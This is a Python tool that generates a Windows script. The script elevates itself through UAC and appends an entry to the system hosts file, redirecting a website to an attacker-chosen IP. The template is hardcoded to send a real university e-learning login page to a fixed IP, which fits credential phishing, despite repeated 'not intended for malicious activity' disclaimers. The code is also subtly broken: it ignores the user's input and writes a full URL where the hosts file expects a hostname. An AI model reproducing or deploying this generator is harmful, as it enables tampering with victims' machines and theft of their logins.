import sys
import argparse
import re
import time

def print_lollipop():
    print("")
    print("")
    print("")
    print("")
    print("\033[94m====================== Created By Mompas =====================\033[0m")
    print("")
    print("")
    print("\033[38;5;205m                           (~~~~~~~~)    ")
    print("                          (~~~~~~~~~~)   ")
    print("                         (~~~~~~~~~~~~)  \033[0m")
    print("\033[95m                        (*############*) ")
    print("                        (*############*) \033[0m")
    print("\033[38;5;205m                         (~~~~~~~~~~~~)  ")
    print("                          (~~~~~~~~~~)   ")
    print("                           (~~~~~~~~)    \033[0m")
    print("                               ||      ")
    print("                               ||      ")
    print("                               ||      ")
    print("                               ||      ")
    print("")
    print("\033[94m================== https://github.com/Mompas ==================\033[0m")
    print("\033[91m")
    print("          !!! NOT INTENDED FOR MALICIOUS ACTIVITY !!!")
    print("")
    print("\033[0m")
    print("")
    print("")
    print("")
    print("")


def displayHelp():
    print("\033[1mHelp Page\033[0m:")
    print("\033[1mDescription:\033[0m")
    print("This script allows you to create a script that redirects a website to a specified IP address.")
    print("\033[1mUsage:\033[0m")
    print("sudo python script.py [-h] [--help]")
    print("\033[1mOptions:\033[0m")
    print("  -h, --help        Show this help message and exit")
    print("\033[1mScript Configuration:\033[0m")
    print("  The script will prompt you to enter the following information:")
    print("    - Website address you want to redirect")
    print("    - IP address you want the user to be redirected to")
    print("\033[1mExample:\033[0m")
    print("  python script.py -h")
    print("  python script.py --help")
    print("\033[1mNotes:\033[0m")
    print("  - The script is not intended for malicious activity.")
    print("  - It is designed for educational or testing purposes only.")
    print("  - Make sure to run the script with appropriate permissions. (sudo)")
    print("  - The generated script is currently executable on Windows only. I'm working on a version for Linux.")
    print("  - The generated script currently triggers UAC. I'm working on a solution.")
    print("\033[1mGitHub Repository:\033[0m")
    print("  https://github.com/Mompas")
    print("\033[1mContact:\033[0m")
    print("  For any questions or issues, please contact Me.")


def userInput():
    global website
    website = input("Enter The Website Address You Want To Redirect: ")
    global redirectIp
    redirectIp = input("Enter The IP Address You Want The User To Be Redirected To: ")
    pattern = re.compile(r'^[0-9.]+$')
    global validIp
    validIp = pattern.match(redirectIp)
    return website, redirectIp, bool(validIp)

def generate_script_content(website, redirectIp):
    script_content = f"""

# ~~~~~~~~~~~~~~~~ Created By Mompas ~~~~~~~~~~~~~~~~~
#
#
# Note: This script is not intended for malicious activity. It is designed for educational or testing purposes only.

import sys
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

def modify_hosts_file():
    website = "https://elearning.aua.am/login/index.php"
    redirect_ip = "145.14.145.85"
    hosts_file_path = "C:\\Windows\\System32\\drivers\\etc\\hosts"
    with open(hosts_file_path, "a") as hosts_file:
        hosts_file.write(f"{redirect_ip} {website}\n")
if not is_admin():
    run_as_admin()
    sys.exit(0)
modify_hosts_file()

"""
    return script_content

isSure = ""

def doubleCheck(website, redirectIp):
    global isSure
    isSureInput = input(f"You Are About To Create A Script That Will Redirect {website} To {redirectIp}. Are You Sure? (y/n): ")
    isSure = isSureInput.lower()
    if isSure == "y":
        script_content = generate_script_content(website, redirectIp)
        save_script(script_content, output_folder)
    elif isSure == "n":
        print("Preparation Cancelled.")
    else:
        print("Invalid Input. Please Try Again.")
        sys.exit()

def save_script(script_content, output_folder):
    print("Preparing The Script", end='', flush=True)

    for _ in range(1):
        time.sleep(1)
        print('.', end='', flush=True)
        time.sleep(1)
        print('.', end='', flush=True)
        time.sleep(1)
        print('.', end='', flush=True)
        time.sleep(1)


    script_path = f"{output_folder}/{fileName}.py"
    with open(script_path, "w") as script_file:
        script_file.write(script_content)
    print("\nScript Preparation Complete!")
    print(f"Script saved at: {script_path}.")
    print("~~~ Enjoy! ~~~")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Description of your script.', add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show this help message and exit')

    args = parser.parse_args()

    if args.help:
        displayHelp()
        sys.exit()

    print_lollipop()
    website, redirectIp, validIp = userInput()
    if validIp:
        fileName = input("Enter A Name For The Script: ")
        output_folder = input("Enter The Folder Path To Save The Script: ")
        doubleCheck(website, redirectIp)
    else:
        print(f"Invalid Redirect IP: {redirectIp}")
